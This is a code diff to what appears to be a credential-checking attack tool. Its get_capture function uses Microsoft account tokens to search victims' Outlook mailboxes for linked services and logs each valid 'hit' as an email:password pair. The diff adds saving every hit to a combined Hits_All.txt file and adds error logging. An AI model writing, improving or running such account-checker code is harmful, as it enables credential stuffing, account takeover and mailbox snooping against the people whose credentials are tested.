@@ -180,6 +180,13 @@ def is_authorized(user_id):
 def get_capture(email, password, access_token, cid, selected_service=None, session_id=None):
     global service_hits
     try:
+        # Always save to general Hits_All.txt first
+        all_hits_path = os.path.join(HITS_DIR, session_id, "Hits_All.txt")
+        os.makedirs(os.path.dirname(all_hits_path), exist_ok=True)
+        with lock:
+            with open(all_hits_path, 'a', encoding='utf-8') as f:
+                f.write(f"{email}:{password}\n")
+        
         search_url = "https://outlook.live.com/search/api/v2/query"
         services_to_check = {selected_service: SERVICES[selected_service]} if selected_service else SERVICES
         
@@ -221,8 +228,14 @@ def get_capture(email, password, access_token, cid, selected_service=None, sessi
                                     with open(output_path, 'a', encoding='utf-8') as f:
                                         f.write(f"{email}:{password}\n")
                                     service_hits[service_name] = service_hits.get(service_name, 0) + 1
-            except: continue
-    except: pass
+                else:
+                    # Log failure to console for debugging
+                    print(f"Search API error ({r.status_code}) for {email} / {service_name}")
+            except Exception as e:
+                print(f"Search error for {email} / {service_name}: {e}")
+                continue
+    except Exception as e:
+        print(f"General capture error for {email}: {e}")
 
 def check_account(email, password, selected_service=None, session_id=None):
     try:
